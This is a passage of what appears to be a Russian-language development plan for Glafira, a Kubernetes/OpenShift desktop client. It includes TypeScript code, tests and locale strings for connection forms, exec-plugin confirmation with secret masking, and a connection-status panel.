            <button type="button" className="danger" disabled={busy} onClick={() => setConfirmingDelete(true)}>
              {t("common.delete")}
            </button>
          ))}
        {busy && <span className="muted">{t("connections.form.busy")}</span>}
      </div>

      {error && <ErrorBanner error={error} />}

      {report && (
        <ul className="steps">
          {report.steps.map((s) => (
            <li key={s.name}>
              {s.ok ? "✅" : "❌"} <strong>{t(`connections.form.step.${s.name}`)}:</strong> <span>{tr(s.message)}</span>
              {s.error?.details && <pre className="muted">{s.error.details}</pre>}
            </li>
          ))}
        </ul>
      )}
    </div>
  );
}
````

<!-- block: file t14-src-components-connections-exec-ts step=14.4 path=src/components/connections/exec.ts -->
````ts
import type { AuthConfig, ExecAuth, ExecEnv } from "../../api/types";

/** Exec-плагин нового подключения: версия API — `v1`, как у современных плагинов. */
export function newExec(): ExecAuth {
  return { command: "", args: [], env: [], apiVersion: "client.authentication.k8s.io/v1", provideClusterInfo: false, approved: null };
}

/** Аргументы — по одному в строке; пустые строки пропускаются. */
export function parseArgs(text: string): string[] {
  return text
    .split("\n")
    .map((s) => s.trim())
    .filter(Boolean);
}

export function formatArgs(args: string[]): string {
  return args.join("\n");
}

/** Переменные — `ИМЯ=значение` по одной в строке; значение может содержать `=`. */
export function parseEnv(text: string): ExecEnv[] {
  return text
    .split("\n")
    .map((s) => s.trim())
    .filter(Boolean)
    .map((line) => {
      const i = line.indexOf("=");
      return i < 0 ? { name: line, value: "" } : { name: line.slice(0, i).trim(), value: line.slice(i + 1) };
    });
}

export function formatEnv(env: ExecEnv[]): string {
  return env.map((v) => `${v.name}=${v.value}`).join("\n");
}

/** Как `auth::exec::is_secret_name` в Rust: значения таких переменных не показываются. */
export function isSecretName(name: string): boolean {
  const n = name.toUpperCase();
  return ["TOKEN", "SECRET", "PASSWORD", "PASSWD", "KEY", "CREDENTIAL"].some((w) => n.includes(w));
}

function quote(s: string): string {
  return s === "" || /[\s'"\\$`]/.test(s) ? `'${s.replace(/'/g, `'\\''`)}'` : s;
}

/** Строка запуска для подтверждения: переменные (секреты скрыты), путь к команде и аргументы. */
export function launchLine(e: ExecAuth): string {
  const env = e.env.map((v) => `${v.name}=${isSecretName(v.name) && v.value ? "••••" : quote(v.value)}`);
  return [...env, quote(e.command), ...e.args.map(quote)].join(" ");
}

function sameLaunch(a: ExecAuth, b: ExecAuth): boolean {
  const key = (e: ExecAuth) => JSON.stringify([e.command, e.args, e.env.map((v) => [v.name, v.value]), e.apiVersion, e.provideClusterInfo]);
  return key(a) === key(b);
}

/**
 * Нужно ли подтвердить строку запуска: новый exec-плагин, строка изменилась или сохранённая
 * не подтверждена. Окончательно решает Rust по отпечатку.
 */
export function needsExecConfirmation(initial: AuthConfig, current: AuthConfig): boolean {
  if (current.method !== "exec") return false;
  return !(initial.method === "exec" && initial.approved && sameLaunch(initial, current));
}
````

<!-- block: file t14-src-components-connections-profile-ts step=14.4 path=src/components/connections/profile.ts -->
````ts
import type { AuthConfig, AuthMethod, CaConfig, CaMode, ConnectionProfile, ExecAuth, ProxyConfig, ProxyMode } from "../../api/types";
import { newExec } from "./exec";

export function newProfile(): ConnectionProfile {
  return {
    id: "",
    name: "",
    color: "#3b82f6",
    environment: "dev",
    readOnly: false,
    apiUrl: "",
    auth: { method: "browser" },
    ca: { mode: "system" },
    tlsServerName: null,
    proxy: { mode: "system" },
    favoriteNamespaces: [],
    manualNamespaces: [],
    requestTimeoutMs: 30000,
    connectTimeoutMs: 10000,
  };
}

/** Способ входа; сертификат и exec-плагин сохраняются при переключении туда и обратно. */
export function withAuthMethod(auth: AuthConfig, method: AuthMethod, lastCertificate = "", lastExec: ExecAuth = newExec()): AuthConfig {
  if (method === "clientCert") return { method, certificatePem: auth.method === "clientCert" ? auth.certificatePem : lastCertificate };
  if (method === "exec") return auth.method === "exec" ? auth : { method, ...lastExec };
  return { method };
}

export function withCaMode(ca: CaConfig, mode: CaMode, lastPem = ""): CaConfig {
  if (mode === "pem") return { mode, pem: ca.mode === "pem" ? ca.pem : lastPem };
  return { mode };
}

export function withProxyMode(proxy: ProxyConfig, mode: ProxyMode, lastUrl = ""): ProxyConfig {
  if (mode === "url") return { mode, url: proxy.mode === "url" ? proxy.url : lastUrl };
  return { mode };
}

/** Проекты: через запятую, пробел или с новой строки; пустые и повторы убираются. */
export function parseNamespaces(text: string): string[] {
  const seen = new Set<string>();
  return text
    .split(/[\s,]+/)
    .map((s) => s.trim())
    .filter((s) => s && !seen.has(s) && seen.add(s));
}

export function formatNamespaces(list: string[]): string {
  return list.join(", ");
}
````

<!-- block: file t14-src-state-workspace-ts step=14.4 path=src/state/workspace.ts -->
````ts
import { create } from "zustand";

export type TabSpec =
  /** Обзор подключения: кто вошёл, версия, права (этап O1b добавит обзор кластера). */
  | { kind: "cluster"; connectionId: string }
  /** folderId — папка нового подключения («Новое подключение здесь»). */
  | { kind: "connection-form"; connectionId: string | null; folderId?: string | null }
  | { kind: "about" }
  /** Справка: глава и раздел руководства (F1, ссылки). */
  | { kind: "help"; chapter?: string; anchor?: string }
  | { kind: "settings" };

export type Tab = TabSpec & { id: string };

export function tabId(spec: TabSpec): string {
  switch (spec.kind) {
    case "connection-form":
      return `connection-form:${spec.connectionId ?? "new"}`;
    case "about":
      return "about";
    case "help":
      return "help";
    case "settings":
      return "settings";
    default:
      return `${spec.kind}:${spec.connectionId}`;
  }
}

interface WorkspaceState {
  tabs: Tab[];
  activeId: string | null;
  open: (spec: TabSpec) => void;
  close: (id: string) => void;
  /** Закрывает все вкладки подключения (например, после его удаления). */
  closeForConnection: (connectionId: string) => void;
  activate: (id: string) => void;
}

export const useWorkspace = create<WorkspaceState>((set) => ({
  tabs: [],
  activeId: null,
  open: (spec) =>
    set((s) => {
      const id = tabId(spec);
      const tab = { ...spec, id } as Tab;
      // Уже открытая вкладка получает новый spec (например, главу справки).
      if (s.tabs.some((t) => t.id === id)) return { tabs: s.tabs.map((t) => (t.id === id ? tab : t)), activeId: id };
      return { tabs: [...s.tabs, tab], activeId: id };
    }),
  close: (id) =>
    set((s) => {
      const idx = s.tabs.findIndex((t) => t.id === id);
      if (idx < 0) return s;
      const tabs = s.tabs.filter((t) => t.id !== id);
      const activeId = s.activeId !== id ? s.activeId : (tabs[idx] ?? tabs[idx - 1])?.id ?? null;
      return { tabs, activeId };
    }),
  closeForConnection: (connectionId) =>
    set((s) => {
      const firstIdx = s.tabs.findIndex((t) => ("connectionId" in t ? t.connectionId : null) === connectionId);
      if (firstIdx < 0) return s;
      const tabs = s.tabs.filter((t) => ("connectionId" in t ? t.connectionId : null) !== connectionId);
      const activeId = tabs.some((t) => t.id === s.activeId)
        ? s.activeId
        : (tabs[firstIdx] ?? tabs[tabs.length - 1])?.id ?? null;
      return { tabs, activeId };
    }),
  activate: (id) => set({ activeId: id }),
}));
````

<!-- block: patch t14-src step=14.4 -->
````diff
diff --git a/PORTED.md b/PORTED.md
--- a/PORTED.md
+++ b/PORTED.md
@@ -84,3 +84,9 @@
 | `src/api/types.ts` | `src/api/types.ts` | `8bbd0bd` | адаптирован: типы Kubernetes |
 | `scripts/i18n-check.mjs` | `scripts/i18n-check.mjs` | `8bbd0bd` | адаптирован: главы руководства O1 |
 | `scripts/i18n-check.test.mjs` | `scripts/i18n-check.test.mjs` | `8bbd0bd` | как есть |
+| `src/components/connections/tree/folderTree.ts` | `src/components/connections/tree/folderTree.ts` | `8bbd0bd` | как есть |
+| `src/components/connections/tree/folderTree.test.ts` | `src/components/connections/tree/folderTree.test.ts` | `8bbd0bd` | как есть |
+| `src/components/connections/ConnectionFormTab.tsx` | `src/components/connections/ConnectionFormTab.tsx` | `8bbd0bd` | как есть |
+| `src/state/workspace.ts` | `src/state/workspace.ts` | `8bbd0bd` | адаптирован: вкладки O1 |
+| `src/components/connections/profile.ts` | `src/components/connections/profile.ts` | `8bbd0bd` | адаптирован: профиль Kubernetes |
+| `src/components/connections/ConnectionForm.tsx` | `src/components/connections/ConnectionForm.tsx` | `8bbd0bd` | адаптирован: поля Kubernetes, секреты, проверка по шагам |
diff --git a/docs/i18n/same-as-en.json b/docs/i18n/same-as-en.json
--- a/docs/i18n/same-as-en.json
+++ b/docs/i18n/same-as-en.json
@@ -1,3 +1,6 @@
 {
-  "ru": []
+  "ru": [
+    "connections.form.step.tcp",
+    "connections.form.step.tls"
+  ]
 }
````

<!-- block: locales t14-locales step=14.4 -->
````json
{
  "en": {
    "connections": {
      "form": {
        "titleNew": "New connection",
        "titleEdit": "Connection “{{name}}”",
        "name": "Name",
        "folder": "Folder",
        "folderRoot": "(root)",
        "environment": "Environment",
        "color": "Color",
        "apiUrl": "API server address",
        "authMethod": "Sign-in method",
        "auth": {
          "browser": "Browser (OpenShift OAuth)",
          "token": "Token",
          "clientCert": "Client certificate",
          "exec": "Exec plugin"
        },
        "browserNote": "After saving, sign in on the connection tab with “Sign in via browser”.",
        "token": "Token",
        "certificate": "Certificate (PEM)",
        "clientKey": "Key (PEM)",
        "exec": {
          "command": "Command",
          "find": "Find",
          "args": "Arguments (one per line)",
          "env": "Environment variables (NAME=value, one per line)",
          "line": "Launch line",
          "confirm": "I allow Glafira to run this command",
          "approved": "Launch line confirmed",
          "forbidden": "Connections with exec plugins are forbidden by your organization."
        },
        "secretKeep": "leave empty to keep unchanged",
        "ca": "Trusted CA",
        "caMode": {
          "system": "System certificate store",
          "pem": "Certificates (PEM)",
          "insecure": "Do not verify (insecure)"
        },
        "caPem": "CA certificates (PEM)",
        "insecureWarning": "The server certificate will not be verified: anyone on the network path can impersonate the cluster.",
        "insecureForbidden": "Connections without certificate verification are forbidden by your organization.",
        "tlsServerName": "TLS server name",
        "proxy": "Proxy",
        "proxyMode": {
          "system": "System (HTTPS_PROXY)",
          "none": "No proxy",
          "url": "Proxy address"
        },
        "proxyUrl": "Proxy address",
        "favorites": "Favorite projects",
        "manualNamespaces": "Projects (if the list is not available)",
        "requestTimeout": "Request timeout, ms",
        "connectTimeout": "Connect timeout, ms",
        "test": "Test connection",
        "deleteGroup": "Delete confirmation",
        "deleteConfirm": "Delete connection “{{name}}”?",
        "deleteYes": "Yes, delete",
        "busy": "Working…",
        "deleted": "The connection was deleted.",
        "step": {
          "config": "Configuration",
          "tcp": "DNS / TCP",
          "exec": "Exec plugin",
          "tls": "TLS",
          "auth": "Sign-in",
          "discovery": "Platform",
          "projects": "Projects"
        }
      }
    },
    "hints": {
      "connections": {
        "environment": "Color and protection: a new <code>prod</code> connection is read-only, and every change on it asks you to type the connection name.",
        "readOnly": "Glafira will not change anything in the cluster through this connection, whatever your rights are.",
        "apiUrl": "The API server, as in <code>oc login</code> or kubeconfig: usually <code>https://api.cluster:6443</code>; a path is allowed (Rancher proxy). Not the web console.",
        "authMethod": "Browser — OpenShift OAuth, like <code>oc login --web</code>. Token — <code>oc whoami -t</code> or a service account token. Certificate — PEM. Exec plugin — a command from kubeconfig.",
        "token": "Saved in the system secret store, not in a file. Tokens from OpenShift OAuth usually expire after 24 hours.",
        "clientCert": "Certificate and key in PEM format. The key is saved in the system secret store.",
        "exec": "Only allowed commands: aws, aws-iam-authenticator, gke-gcloud-auth-plugin, kubelogin, kubectl oidc-login, oc, yc, rancher. Run without a shell; may open the browser.",
        "execLine": "Exactly what Glafira will run. Values of variables that look like secrets are hidden. Any change to the line needs a new confirmation.",
        "ca": "System store — the CAs trusted by your computer. Certificates — only the listed ones, like <code>certificate-authority</code> in kubeconfig.",
        "tlsServerName": "Only if the certificate is issued for another name than the address host. Usually empty.",
        "proxy": "System — the <code>HTTPS_PROXY</code> and <code>NO_PROXY</code> variables. Or an explicit address like <code>http://proxy:3128</code>.",
        "favorites": "Shown first in the tree. Separate with commas.",
        "manualNamespaces": "If the cluster does not let you list projects, list the ones you work with here.",
        "test": "Checks step by step: address, TLS, sign-in, platform and projects. Unsaved fields are tested too."
      }
    }
  },
  "ru": {
    "connections": {
      "form": {
        "titleNew": "Новое подключение",
        "titleEdit": "Подключение «{{name}}»",
        "name": "Имя",
        "folder": "Папка",
        "folderRoot": "(корень)",
        "environment": "Окружение",
        "color": "Цвет",
        "apiUrl": "Адрес API-сервера",
        "authMethod": "Способ входа",
        "auth": {
          "browser": "Браузер (OAuth OpenShift)",
          "token": "Токен",
          "clientCert": "Клиентский сертификат",
          "exec": "Exec-плагин"
        },
        "browserNote": "После сохранения войдите на вкладке подключения кнопкой «Войти через браузер».",
        "token": "Токен",
        "certificate": "Сертификат (PEM)",
        "clientKey": "Ключ (PEM)",
        "exec": {
          "command": "Команда",
          "find": "Найти",
          "args": "Аргументы (по одному в строке)",
          "env": "Переменные окружения (ИМЯ=значение, по одной в строке)",
          "line": "Строка запуска",
          "confirm": "Разрешаю Glafira запускать эту команду",
          "approved": "Строка запуска подтверждена",
          "forbidden": "Подключения с exec-плагином запрещены вашей организацией."
        },
        "secretKeep": "оставьте пустым, чтобы не менять",
        "ca": "Доверенный CA",
        "caMode": {
          "system": "Системное хранилище сертификатов",
          "pem": "Сертификаты (PEM)",
          "insecure": "Не проверять (небезопасно)"
        },
        "caPem": "Сертификаты CA (PEM)",
        "insecureWarning": "Сертификат сервера не будет проверяться: любой на сетевом пути сможет выдать себя за кластер.",
        "insecureForbidden": "Подключения без проверки сертификата запрещены вашей организацией.",
        "tlsServerName": "Имя для проверки TLS",
        "proxy": "Прокси",
        "proxyMode": {
          "system": "Системный (HTTPS_PROXY)",
          "none": "Без прокси",
          "url": "Адрес прокси"
        },
        "proxyUrl": "Адрес прокси",
        "favorites": "Избранные проекты",
        "manualNamespaces": "Проекты (если список недоступен)",
        "requestTimeout": "Таймаут запроса, мс",
        "connectTimeout": "Таймаут подключения, мс",
        "test": "Проверить подключение",
        "deleteGroup": "Подтверждение удаления",
        "deleteConfirm": "Удалить подключение «{{name}}»?",
        "deleteYes": "Да, удалить",
        "busy": "Выполняется…",
        "deleted": "Подключение удалено.",
        "step": {
          "config": "Конфигурация",
          "tcp": "DNS / TCP",
          "exec": "Exec-плагин",
          "tls": "TLS",
          "auth": "Вход",
          "discovery": "Платформа",
          "projects": "Проекты"
        }
      }
    },
    "hints": {
      "connections": {
        "environment": "Цвет и защита: новое подключение <code>prod</code> — только для чтения, а каждое изменение в нём требует ввести имя подключения.",
        "readOnly": "Glafira ничего не изменит в кластере через это подключение, какие бы права у вас ни были.",
        "apiUrl": "API-сервер, как в <code>oc login</code> или kubeconfig: обычно <code>https://api.cluster:6443</code>; путь допускается (прокси Rancher). Не адрес веб-консоли.",
        "authMethod": "Браузер — OAuth OpenShift, как <code>oc login --web</code>. Токен — <code>oc whoami -t</code> или токен сервисной учётной записи. Сертификат — PEM. Exec-плагин — команда из kubeconfig.",
        "token": "Хранится в системном хранилище секретов, а не в файле. Токены OAuth OpenShift обычно истекают через 24 часа.",
        "clientCert": "Сертификат и ключ в формате PEM. Ключ хранится в системном хранилище секретов.",
        "exec": "Только разрешённые команды: aws, aws-iam-authenticator, gke-gcloud-auth-plugin, kubelogin, kubectl oidc-login, oc, yc, rancher. Запуск без оболочки; плагин может открыть браузер.",
        "execLine": "Ровно то, что запустит Glafira. Значения переменных, похожих на секреты, скрыты. Любое изменение строки требует нового подтверждения.",
        "ca": "Системное хранилище — CA, которым доверяет компьютер. Сертификаты — только перечисленные, как <code>certificate-authority</code> в kubeconfig.",
        "tlsServerName": "Только если сертификат выпущен на другое имя, чем хост адреса. Обычно пусто.",
        "proxy": "Системный — переменные <code>HTTPS_PROXY</code> и <code>NO_PROXY</code>. Или явный адрес вида <code>http://proxy:3128</code>.",
        "favorites": "Показываются первыми в дереве. Через запятую.",
        "manualNamespaces": "Если кластер не даёт вам список проектов, перечислите здесь те, с которыми работаете.",
        "test": "Проверяет по шагам: адрес, TLS, вход, платформу и проекты. Несохранённые поля тоже проверяются."
      }
    }
  }
}
````

Применить: `python3 /tmp/o1a-blocks.py step 14.4`.

- [ ] **Step 5: Проверки.**

Run: `pnpm test`  
Expected: PASS — `Test Files 16 passed`, `Tests 69 passed`

Run: `pnpm exec tsc --noEmit`  
Expected: PASS — без ошибок

Run: `pnpm i18n:check`  
Expected: PASS — `✓ словари en, ru согласованы, вызовов из Rust: 126`

- [ ] **Step 6: Commit.**

```bash
git add -A
git commit -s -m "feat(ui): форма подключения — способы входа (в том числе exec-плагин), CA, прокси, проекты, проверка по шагам" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

### Task 15: Вкладка подключения: кто вошёл, платформа и группы API, права, вход заново

**Files:**
- Create: `src/components/cluster/ConnectionPanel.test.tsx`, `src/components/cluster/ConnectionPanel.tsx`, `src/components/cluster/SessionActions.tsx`
- Modify: `src/locales/en.json`, `src/locales/ru.json`

**Interfaces:**
- Consumes: задачи 13–14.
- Produces: `components/cluster/ConnectionPanel({ connectionId })`, `components/cluster/SessionActions({ profile })`.

Спец. §4.3, §5.2–5.4. Вкладка `cluster` в O1a подключается при открытии (`api.connect(id, false)`, ключ запроса `["connection", id]`) и показывает пользователя, платформу («OpenShift 4.18», «Kubernetes 1.31 (EKS)»), версию Kubernetes, найденные группы API (Route, Project, DeploymentConfig, Gateway API), права уровня кластера (права на ClusterOperators и ClusterVersion — только у OpenShift) и группы пользователя. При `SESSION_EXPIRED` и ошибках «нет токена» / «нужно войти» — действия по способу входа: «Войти через браузер» (с «Отменить», пока ждём), вставка токена (сохраняет и подключается заново), «Получить токен на странице кластера»; у сертификата — «Изменить подключение»; у exec-плагина — «Ожидание exec-плагина…» с «Отменить» во время подключения, а при его ошибке — «Запустить exec-плагин снова» и «Изменить подключение». Прочие ошибки — баннер с «Повторить». Этап O1b заменит эту вкладку полным обзором кластера.

- [ ] **Step 1: Тесты.**

<!-- block: file t15-src-components-cluster-connectionpanel-test-tsx step=15.1 path=src/components/cluster/ConnectionPanel.test.tsx -->
````tsx
import { screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { renderWithClient } from "../../test/render";

vi.mock("@tauri-apps/plugin-opener", () => ({ openUrl: vi.fn() }));

vi.mock("../../api/client", async (importOriginal) => {
  const orig = await importOriginal<typeof import("../../api/client")>();
  return {
    ...orig,
    api: {
      listConnections: vi.fn(),
      connect: vi.fn(),
      startOauthLogin: vi.fn(),
      cancelOauthLogin: vi.fn(),
      setConnectionToken: vi.fn(),
      oauthTokenPage: vi.fn(),
    },
  };
});

import { openUrl } from "@tauri-apps/plugin-opener";
import { api } from "../../api/client";
import type { ConnectionInfo, ConnectionProfile } from "../../api/types";
import { useWorkspace } from "../../state/workspace";
import { newProfile } from "../connections/profile";
import { ConnectionPanel } from "./ConnectionPanel";

const INFO: ConnectionInfo = {
  user: "dev1",
  groups: ["system:authenticated", "team-a"],
  serverVersion: "v1.32.5",
  platform: { kind: "openshift", distribution: null, version: "4.18", label: "OpenShift 4.18" },
  apiGroups: { routes: true, projects: true, deploymentConfigs: true, gatewayApi: false },
  capabilities: { listProjects: true, listNodes: false, listAllPods: false, readClusterOperators: true, readClusterVersion: false },
};

const profile = (auth: ConnectionProfile["auth"]): ConnectionProfile => ({
  ...newProfile(),
  id: "c1",
  name: "dev-cluster",
  apiUrl: "https://api.dev:6443",
  auth,
});

const EXPIRED = { code: "SESSION_EXPIRED", key: "errors.k8s.unauthorized", message: "x", retryable: false };

beforeEach(() => {
  vi.clearAllMocks();
  useWorkspace.setState({ tabs: [], activeId: null });
});

describe("ConnectionPanel", () => {
  it("подключается и показывает пользователя, платформу, группы API и права", async () => {
    vi.mocked(api.listConnections).mockResolvedValue([profile({ method: "token" })]);
    vi.mocked(api.connect).mockResolvedValue(INFO);
    renderWithClient(<ConnectionPanel connectionId="c1" />);
    expect(await screen.findByText("dev1")).toBeInTheDocument();
    expect(api.connect).toHaveBeenCalledWith("c1", false);
    expect(screen.getByText("OpenShift 4.18")).toBeInTheDocument();
    expect(screen.getByText("Route, Project, DeploymentConfig")).toBeInTheDocument();
    expect(screen.getByText("✅ Операторы кластера")).toBeInTheDocument();
    expect(screen.getByText("v1.32.5")).toBeInTheDocument();
    expect(screen.getByText("✅ Список проектов")).toBeInTheDocument();
    expect(screen.getByText("— Ноды")).toBeInTheDocument();
    expect(screen.getByText("2 группы")).toBeInTheDocument();
  });

  it("Kubernetes: платформа с дистрибутивом, Gateway API, без прав OpenShift", async () => {
    vi.mocked(api.listConnections).mockResolvedValue([profile({ method: "token" })]);
    vi.mocked(api.connect).mockResolvedValue({
      ...INFO,
      platform: { kind: "kubernetes", distribution: "eks", version: "1.31", label: "Kubernetes 1.31 (EKS)" },
      apiGroups: { routes: false, projects: false, deploymentConfigs: false, gatewayApi: true },
    });
    renderWithClient(<ConnectionPanel connectionId="c1" />);
    expect(await screen.findByText("Kubernetes 1.31 (EKS)")).toBeInTheDocument();
    expect(screen.getByText("Gateway API")).toBeInTheDocument();
    expect(screen.queryByText(/Операторы кластера/)).toBeNull();
  });

  it("exec-плагин: ожидание с отменой, ошибка плагина и запуск снова", async () => {
    const exec: ConnectionProfile["auth"] = {
      method: "exec",
      command: "/opt/homebrew/bin/kubelogin",
      args: ["get-token"],
      env: [],
      apiVersion: "client.authentication.k8s.io/v1",
      provideClusterInfo: false,
      approved: "fp",
    };
    vi.mocked(api.listConnections).mockResolvedValue([profile(exec)]);
    let fail: (e: unknown) => void = () => {};
    vi.mocked(api.connect).mockReturnValueOnce(new Promise((_, reject) => (fail = reject)));
    const user = userEvent.setup();
    renderWithClient(<ConnectionPanel connectionId="c1" />);
    expect(await screen.findByText(/Ожидание exec-плагина/)).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Отменить" }));
    expect(api.cancelOauthLogin).toHaveBeenCalledWith("c1");
    fail({ code: "AUTH_FAILED", key: "errors.exec.failed", params: { command: "kubelogin", code: "1" }, message: "x", retryable: false });
    vi.mocked(api.connect).mockResolvedValue(INFO);
    await user.click(await screen.findByRole("button", { name: "Запустить exec-плагин снова" }));
    expect(api.connect).toHaveBeenLastCalledWith("c1", true);
    expect(await screen.findByText("dev1")).toBeInTheDocument();
  });

  it("истёкшая сессия у входа через браузер: вход и успешное подключение", async () => {
    vi.mocked(api.listConnections).mockResolvedValue([profile({ method: "browser" })]);
    vi.mocked(api.connect).mockRejectedValue(EXPIRED);
    let finish: (i: ConnectionInfo) => void = () => {};
    vi.mocked(api.startOauthLogin).mockReturnValue(new Promise((r) => (finish = r)));
    const user = userEvent.setup();
    renderWithClient(<ConnectionPanel connectionId="c1" />);
    await user.click(await screen.findByRole("button", { name: "Войти через браузер" }));
    expect(api.startOauthLogin).toHaveBeenCalledWith("c1");
    expect(screen.getByText("Ожидание входа в браузере…")).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Отменить" }));
    expect(api.cancelOauthLogin).toHaveBeenCalledWith("c1");
    finish(INFO);
    expect(await screen.findByText("dev1")).toBeInTheDocument();
  });

  it("вставка токена сохраняет его и подключается заново", async () => {
    vi.mocked(api.listConnections).mockResolvedValue([profile({ method: "token" })]);
    vi.mocked(api.connect).mockRejectedValueOnce(EXPIRED).mockResolvedValue(INFO);
    vi.mocked(api.setConnectionToken).mockResolvedValue();
    const user = userEvent.setup();
    renderWithClient(<ConnectionPanel connectionId="c1" />);
    expect(screen.queryByRole("button", { name: "Войти через браузер" })).toBeNull();
    await user.type(await screen.findByLabelText("Токен"), "sha256~new");
    await user.click(screen.getByRole("button", { name: "Сохранить токен" }));
    await waitFor(() => expect(api.setConnectionToken).toHaveBeenCalledWith("c1", "sha256~new"));
    expect(api.connect).toHaveBeenLastCalledWith("c1", true);
    expect(await screen.findByText("dev1")).toBeInTheDocument();
  });

  it("страница токена кластера открывается в браузере", async () => {
    vi.mocked(api.listConnections).mockResolvedValue([profile({ method: "browser" })]);
    vi.mocked(api.connect).mockRejectedValue(EXPIRED);
    vi.mocked(api.oauthTokenPage).mockResolvedValue("https://oauth-openshift.apps.dev/oauth/token/request");
    const user = userEvent.setup();
    renderWithClient(<ConnectionPanel connectionId="c1" />);
    await user.click(await screen.findByRole("button", { name: "Получить токен на странице кластера" }));
    await waitFor(() => expect(openUrl).toHaveBeenCalledWith("https://oauth-openshift.apps.dev/oauth/token/request"));
  });

  it("прочая ошибка — баннер с повтором; сертификат — кнопка изменения подключения", async () => {
    vi.mocked(api.listConnections).mockResolvedValue([profile({ method: "clientCert", certificatePem: "PEM" })]);
    vi.mocked(api.connect).mockRejectedValueOnce({ code: "CONNECTION_FAILED", key: "errors.k8s.connect", message: "x", retryable: true });
    const user = userEvent.setup();
    const { unmount } = renderWithClient(<ConnectionPanel connectionId="c1" />);
    expect(await screen.findByText("Не удаётся подключиться к серверу")).toBeInTheDocument();
    vi.mocked(api.connect).mockResolvedValue(INFO);
    await user.click(screen.getByRole("button", { name: "Повторить" }));
    expect(await screen.findByText("dev1")).toBeInTheDocument();
    unmount();

    vi.mocked(api.connect).mockRejectedValue({ code: "AUTH_FAILED", key: "errors.connections.clientKeyMissing", message: "x", retryable: false });
    renderWithClient(<ConnectionPanel connectionId="c1" />);
    const buttons = await screen.findAllByRole("button", { name: "Изменить подключение" });
    await user.click(buttons[buttons.length - 1]);
    expect(useWorkspace.getState().activeId).toBe("connection-form:c1");
  });
});
````

Применить: `python3 /tmp/o1a-blocks.py step 15.1`.

- [ ] **Step 2: Увидеть падение.**

Run: `pnpm vitest run src/components/cluster/ConnectionPanel.test.tsx`
Expected: FAIL — нет модулей или компонентов, которые проверяют тесты.

- [ ] **Step 3: Реализация.**

<!-- block: file t15-src-components-cluster-connectionpanel-tsx step=15.3 path=src/components/cluster/ConnectionPanel.tsx -->
````tsx
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { useTranslation } from "react-i18next";
import { api, toAppError } from "../../api/client";
import type { ApiGroups, AppError, Capabilities, ConnectionInfo, ConnectionProfile } from "../../api/types";
import { useWorkspace } from "../../state/workspace";
import { ErrorBanner } from "../common/ErrorBanner";
import { Hint } from "../common/Hint";
import { SessionActions } from "./SessionActions";

/** Ошибки, которые лечатся входом заново или новым токеном. */
const SIGN_IN_KEYS = new Set(["errors.connections.tokenMissing", "errors.connections.loginRequired", "errors.connections.clientKeyMissing"]);

const CAPABILITIES: (keyof Capabilities)[] = ["listProjects", "listNodes", "listAllPods", "readClusterOperators", "readClusterVersion"];
/** Права, которые бывают только у OpenShift. */
const OPENSHIFT_ONLY: (keyof Capabilities)[] = ["readClusterOperators", "readClusterVersion"];

/** Группы API, найденные в кластере; названия видов не переводятся. */
const API_GROUPS: [keyof ApiGroups, string][] = [
  ["routes", "Route"],
  ["projects", "Project"],
  ["deploymentConfigs", "DeploymentConfig"],
  ["gatewayApi", "Gateway API"],
];

/** Помогает ли войти заново: истёкшая сессия, нет токена или ключа, ошибка exec-плагина. */
function needsSignIn(e: AppError, profile: ConnectionProfile): boolean {
  if (e.code === "SESSION_EXPIRED" || SIGN_IN_KEYS.has(e.key ?? "")) return true;
  return profile.auth.method === "exec" && (e.key?.startsWith("errors.exec.") || e.key === "errors.oauth.cancelled");
}

/** Вкладка подключения: подключается при открытии и показывает, кто вошёл, что за кластер и какие есть права. */
export function ConnectionPanel({ connectionId }: { connectionId: string }) {
  const { t } = useTranslation();
  const queryClient = useQueryClient();
  const open = useWorkspace((s) => s.open);
  const connections = useQuery({ queryKey: ["connections"], queryFn: api.listConnections });
  const q = useQuery({ queryKey: ["connection", connectionId], queryFn: () => api.connect(connectionId, false) });
  const profile = connections.data?.find((c) => c.id === connectionId);

  // Подключение заново: свежие сведения и права (после смены токена или прав в кластере).
  const reconnect = () => queryClient.fetchQuery({ queryKey: ["connection", connectionId], queryFn: () => api.connect(connectionId, true) });

  if (!profile) return <p className="empty">{connections.isPending ? t("common.loading") : t("connections.form.deleted")}</p>;

  return (
    <div className="page">
      <div className="toolbar">
        <h2>{profile.name}</h2>
        <span className="muted">{profile.apiUrl}</span>
        <button type="button" disabled={q.isFetching} onClick={() => void reconnect().catch(() => undefined)}>
          {t("cluster.connection.reconnect")}
        </button>
        <button type="button" onClick={() => open({ kind: "connection-form", connectionId })}>
          {t("cluster.connection.edit")}
        </button>
      </div>
      {q.isPending &&
        (profile.auth.method === "exec" ? (
          // Exec-плагин может ждать входа в браузере до 5 минут.
          <div className="toolbar">
            <span className="muted">{t("cluster.session.waitingExec")}</span>
            <button type="button" onClick={() => void api.cancelOauthLogin(connectionId)}>
              {t("cluster.session.cancelLogin")}
            </button>
          </div>
        ) : (
          <p className="muted">{t("cluster.connection.connecting")}</p>
        ))}
      {q.error && <ConnectionError error={q.error} onRetry={() => void q.refetch()} profile={profile} />}
      {q.data && <ConnectionSummary info={q.data} />}
    </div>
  );
}

function ConnectionError({ error, onRetry, profile }: { error: unknown; onRetry: () => void; profile: ConnectionProfile }) {
  const { t } = useTranslation();
  const e = toAppError(error);
  const signIn = needsSignIn(e, profile);
  return (
    <>
      <ErrorBanner error={e} onRetry={signIn ? undefined : onRetry} />
      {signIn && (
        <>
          <h3>{t("cluster.session.title")}</h3>
          <SessionActions profile={profile} />
        </>
      )}
    </>
  );
}

function ConnectionSummary({ info }: { info: ConnectionInfo }) {
  const { t } = useTranslation();
  const openShift = info.platform.kind === "openshift";
  const found = API_GROUPS.filter(([k]) => info.apiGroups[k]).map(([, name]) => name);
  return (
    <>
      <dl className="stats">
        <div>
          <dt>{t("cluster.connection.user")}</dt>
          <dd>{info.user}</dd>
        </div>
        <div>
          <dt>
            <span className="field-label">
              {t("cluster.connection.platform")}
              <Hint k="hints.cluster.platform" label={t("cluster.connection.platform")} />
            </span>
          </dt>
          <dd>{info.platform.label}</dd>
        </div>
        <div>
          <dt>{t("cluster.connection.version")}</dt>
          <dd>{info.serverVersion}</dd>
        </div>
        <div>
          <dt>
            <span className="field-label">
